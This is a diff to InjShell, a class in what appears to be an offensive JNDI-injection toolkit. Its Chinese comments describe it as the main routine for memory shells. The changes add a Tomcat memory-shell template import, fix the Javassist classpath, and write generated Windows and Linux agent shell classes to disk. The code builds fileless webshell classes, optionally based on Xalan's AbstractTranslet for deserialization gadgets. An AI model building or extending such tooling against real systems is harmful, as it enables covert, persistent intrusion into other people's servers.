@@ -4,6 +4,7 @@ import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.template.Agent.LinMenshell;
 import com.nu1r.jndi.template.Agent.WinMenshell;
 import com.nu1r.jndi.template.tomcat.TFJMX;
+import com.nu1r.jndi.template.tomcat.TSMSFromJMXS;
 import javassist.*;
 
 import java.lang.reflect.Field;
@@ -114,6 +115,10 @@ public class InjShell {
     }
 
     public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
+        //添加到类路径，防止出错
+        ClassPool pool;
+        pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(TFJMX.class));
         // 根据传入的不同参数，在不同方法中插入不同的逻辑
         CtMethod cm = ctClass.getDeclaredMethod(method);
         cm.setBody(payload);
@@ -244,8 +249,8 @@ public class InjShell {
 
     public static void exAbstract(CtClass ctClass) throws Exception {
         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-            ClassPool pool = ClassPool.getDefault();
+            Class     abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            ClassPool pool         = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(abstTranslet));
             CtClass superClass = pool.get(abstTranslet.getName());
             ctClass.setSuperclass(superClass);
@@ -253,7 +258,7 @@ public class InjShell {
     }
 
     //路由器中内存马主要执行方法
-    public static String structureShell( Class<?> payload) throws Exception{
+    public static String structureShell(Class<?> payload) throws Exception {
         Config.init();
         String    className = "";
         ClassPool pool;
@@ -265,10 +270,12 @@ public class InjShell {
         ctClass.setName(generateClassName());
         if (winAgent) {
             className = insertWinAgent(ctClass);
+            ctClass.writeFile();
             return className;
         }
         if (linAgent) {
             className = insertLinAgent(ctClass);
+            ctClass.writeFile();
             return className;
         }
         className = ctClass.getName();
